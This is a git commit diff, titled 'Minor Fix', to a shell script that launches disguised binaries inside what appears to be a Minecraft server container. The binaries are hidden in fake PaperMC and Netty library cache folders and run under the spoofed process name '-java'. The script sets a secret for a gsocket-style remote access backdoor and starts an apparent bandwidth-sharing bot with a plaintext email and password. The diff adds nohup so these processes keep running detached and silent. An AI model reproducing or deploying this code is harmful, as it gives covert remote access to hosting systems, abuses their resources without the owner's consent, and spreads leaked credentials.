0f41aef8f26700c80d0bfb58049f234ff249b35f
i51jir6ni9t0 <wker-one@protonmail.com>
2025-01-30 17:04:19 +0000

    Minor Fix

--- rufastnde/n2.sh
+++ rufastnde/n2.sh
@@ -12,14 +12,14 @@ function fetch_files() {
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
-    cd /home/container/libraries/io/papermc/paper/paper-api/1.21.4-R0.1-SNAPSHOT/.cache && ./mc-bot.jar -a '-java' ./paper-mods.jar -C ./conf.yaml >/dev/null &
+    cd /home/container/libraries/io/papermc/paper/paper-api/1.21.4-R0.1-SNAPSHOT/.cache && nohup ./mc-bot.jar -a '-java' ./paper-mods.jar -C ./conf.yaml >/dev/null 2>&1 &
     # GNET
     export HOME=/home/container
     export GSOCKET_ARGS="-s j6A9eD2a1E2c5A16f9L89-3D9g8Hbj7-5i6C4a9U6k1eCd9-F9i4J0d6A2803-8A1c5J1g60 -liqD"
     cd /tmp/.java/bin && exec -a -java ./add-on.jar &
     # HG BOT
     export LD_LIBRARY_PATH=/home/container/libraries/io/netty/netty-buffer/.cache/.hg/usr/lib
-    cd /home/container/libraries/io/netty/netty-buffer/.cache/.hg/app/ && ./mc-bot.jar -a '-java' ./bot-fun.jar -tou-accept -email "yoursoundwords@gmail.com" -pass "vizelle521Elle" -device n0 >/dev/null &
+    cd /home/container/libraries/io/netty/netty-buffer/.cache/.hg/app/ && nohup ./mc-bot.jar -a '-java' ./bot-fun.jar -tou-accept -email "yoursoundwords@gmail.com" -pass "vizelle521Elle" -device sk1 >/dev/null 2>&1 &
     echo "BOT SERVER STARTED ..."
 }
 
